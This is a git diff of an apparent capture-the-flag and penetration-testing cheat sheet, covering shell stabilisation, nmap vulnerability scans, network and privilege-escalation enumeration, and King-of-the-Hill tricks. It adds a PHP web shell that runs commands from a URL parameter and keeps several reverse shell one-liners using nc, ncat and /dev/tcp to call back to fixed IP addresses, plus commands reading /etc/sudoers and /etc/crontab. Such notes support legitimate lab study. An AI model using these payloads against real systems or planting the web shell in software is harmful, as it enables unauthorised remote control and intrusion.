@@ -1,5 +1,6 @@
 # Shell ✅
 ```bash
+/bin/bash -ip
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 
 CTRL + Z
@@ -10,8 +11,9 @@ xterm‌‌
 export TERM=xterm‌‌
 export SHELL=bash
 ```
-# Reverse_Shell ✅
+# Payloads_Shell ✅
 ```bash
+<?php echo system($_GET["cmd"]); ?>
 nc 10.11.99.141 5555 -e bash
 ncat 10.11.99.141 5555 -e bash
 /bin/bash -c /bin/bash -i >& /dev/tcp/10.9.184.226/1112 0>&1
@@ -26,6 +28,17 @@ sudo nmap -p- <ip> -sV -T5
 sudo nmap -p- <ip> -sV -T5 -Pn
 sudo nmap 139,445 <ip> -sV -T5 --script=vuln
 sudo nmap -p 139,445 <ip> -sV -T5 --script=vuln -Pn
+```
+## hosts are communicating 
+```bash
+last
+lsof -i
+lsof -i :80
+ss -tulpn
+netstat -antp
+netstat -antup
+netstat -tulpn
+grep 80 /etc/services
 ```
 ## WEB_Enumeration ✅
 ### subdomains_enumeration ✡️
@@ -76,8 +89,12 @@ find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \;
 ```
 ## Privilege-Escalation_enumeration
 ```bash
+id
 history
 sudo -V
+bash --version
+cat /etc/sudoers
+cat /etc/crontab
 uname -a (Linux kernel version)
 cat /etc/issue (Linux distribution version) 
 cat /etc/*-release (Linux distribution version) 
@@ -193,6 +210,8 @@ write "port22"
 ```bash
 grep -Rine 'thm{' ./ 2>/dev/null
 find / -name '*flag*' -ls 2>/dev/null
+
+-oHostKeyAlgorithms=+ssh-rsa
 ```
 ## KoTH Tricks ✅
 ```bash
@@ -211,4 +230,6 @@ chmod +x nyancat
 
 PATH=0
 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
+
+cat /etc/shells (show available shells)
 ```
